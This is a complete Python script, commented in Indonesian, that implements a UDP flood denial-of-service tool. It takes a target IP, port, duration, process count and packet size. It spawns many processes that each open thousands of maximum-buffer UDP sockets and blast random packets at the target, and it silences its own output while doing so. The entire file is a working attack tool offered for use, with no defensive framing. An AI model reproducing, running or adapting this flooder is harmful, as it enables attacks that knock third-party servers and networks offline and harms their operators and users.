import socket
import multiprocessing
import sys
import os
import time

def UDP_ATTACK(s, size, addr, duration):
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            try:
                for _ in range(1000):  # Loop biasa lebih efisien
                    s.sendto(os.urandom(size), addr)
            except socket.error:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2147483647)  # Max buffer
    except Exception:
        pass
    finally:
        s.close()

def SOC(addr, size, duration):
    sockets = []
    try:
        # Bikin banyak socket
        for _ in range(2000):  # 2000 socket per process
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2147483647)  # Max buffer
            sockets.append(s)
        # Jalankan serangan
        for s in sockets:
            multiprocessing.Process(target=UDP_ATTACK, args=(s, size, addr, duration)).start()
    except Exception:
        pass

def main():
    # Cek jumlah argumen
    if len(sys.argv) != 6:
        print("Usage: python3 script.py <IP> <PORT> <DURATION> <PROCESS> <SIZE>")
        sys.exit(1)  # Keluar dengan error code 1

    # Ambil argumen
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    process = int(sys.argv[4])
    size = int(sys.argv[5])

    # Matikan logging biar CPU fokus
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

    # Jalankan serangan
    processes = []
    for _ in range(process):
        p = multiprocessing.Process(target=SOC, args=((ip, port), size, duration))
        p.start()
        processes.append(p)

    # Tunggu semua proses selesai
    for p in processes:
        p.join()

    sys.exit(0)

if __name__ == "__main__":
    main()